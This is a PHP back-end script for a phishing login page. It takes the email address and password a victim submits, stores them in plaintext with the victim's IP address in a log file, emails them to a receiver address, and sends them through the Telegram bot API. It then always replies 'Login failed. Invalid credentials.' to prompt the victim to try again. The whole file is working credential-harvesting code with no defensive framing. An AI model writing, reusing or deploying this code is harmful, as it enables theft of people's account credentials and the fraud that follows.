<?php
require_once 'email.php';

// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_VALIDATE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Validate email and password
if (!empty($email) && !empty($password)) {
    try {
        /***** Logging Section *****/
        // Ensure logs directory exists
        $logsFolder = __DIR__ . '/logs';
        if (!is_dir($logsFolder)) {
            if (!mkdir($logsFolder, 0755, true)) {
                error_log("Failed to create logs directory: {$logsFolder}");
            }
        }

        // Save log data to file
        $logFile = "{$logsFolder}/login_attempts.txt";
        $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
        if (file_put_contents($logFile, $logData, FILE_APPEND) === false) {
            error_log("Failed to write log data to file: {$logFile}");
        }

        /***** Email Section *****/
        $receiverEmail = getenv('RECEIVER_EMAIL') ?: 'default@domain.com'; // Replace 'default@domain.com' with a fallback email
        $subject = "Login Attempt: {$email}";
        if (!mail($receiverEmail, $subject, $logData)) {
            error_log("Failed to send email to {$receiverEmail}");
        }

        /***** Telegram Notification Section *****/
        $botToken = getenv('TELEGRAM_BOT_TOKEN'); // Set Telegram bot token in environment variables
        $chatId = getenv('TELEGRAM_CHAT_ID'); // Set Telegram chat ID in environment variables
        $telegramMessage = urlencode($logData);
        $telegramApi = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$telegramMessage}";

        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $telegramApi,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
        ]);

        $telegramResponse = curl_exec($curl);
        if ($telegramResponse === false) {
            error_log("Failed to send Telegram message. Error: " . curl_error($curl));
        }
        curl_close($curl);

        /***** Final Response *****/
        sendJsonResponse(false, "Login failed. Invalid credentials.");
    } catch (Exception $e) {
        error_log("Server exception: " . $e->getMessage());
        sendJsonResponse(false, "A server error occurred while handling your request.");
    }
} else {
    // Handle invalid parameters
    sendJsonResponse(false, "Email or Password missing.");
}
?>
